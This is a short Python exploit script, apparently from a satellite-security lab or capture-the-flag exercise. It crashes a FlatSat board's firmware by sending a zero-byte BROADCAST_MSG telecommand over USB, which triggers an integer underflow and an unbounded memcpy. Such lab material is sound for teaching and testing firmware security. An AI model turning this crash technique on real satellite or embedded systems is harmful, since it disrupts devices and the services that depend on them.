#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 02_fuzzing_crash_usb.py -- BROADCAST_MSG integer underflow over the USB
# CDC serial link instead of RF. See 02_fuzzing_crash_rf.py for the full
# root-cause writeup (unsigned size_t underflow, unbounded memcpy).
#
# Expected: the board hard-faults and reboots. The USB CDC port drops and a
# new one re-enumerates a few seconds later, so this script's own connection
# does not survive the crash -- check the FlatSat's serial console or
# PWNSAT-C3 for the reboot (uptime resets to 0).

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat_usb import FlatSatUSB  # noqa: E402


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--seq", type=int, default=1, help="SPP sequence count")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--port", default=None,
                        help="serial port for the USBRadioLink (default: autodetect)")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    print(f"[*] BROADCAST_MSG packet with a 0-byte payload "
          f"({'encrypted' if args.encrypt == 'on' else 'cleartext'}, seq={args.seq})")
    print("[*] This is the entire exploit -- msg_len = payload_total - 2 underflows "
          "to ~4.29 billion on the firmware side once this decrypts to 0 bytes.")

    with FlatSatUSB(port=args.port, encrypt=(args.encrypt == "on"),
                    verbose=not args.quiet) as fsat:
        try:
            fsat.send_tc("broadcast", seq=args.seq, payload_hex=b"", listen_seconds=1.0)
        except Exception as exc:  # noqa: BLE001 -- the crash itself can drop the port mid-write
            print(f"[*] Write/read raised {exc!r} -- this can happen if the board "
                  "crashed fast enough to drop the USB CDC connection before the "
                  "read timeout finished. Not itself proof of anything either way.")

    print("[+] Sent. The board's USB port is expected to disappear and "
          "re-enumerate a few seconds later if the crash landed -- check the "
          "FlatSat's serial console or PWNSAT-C3 for the reboot (uptime resets "
          "to 0). This script's own connection does not survive the crash.")


if __name__ == "__main__":
    main()
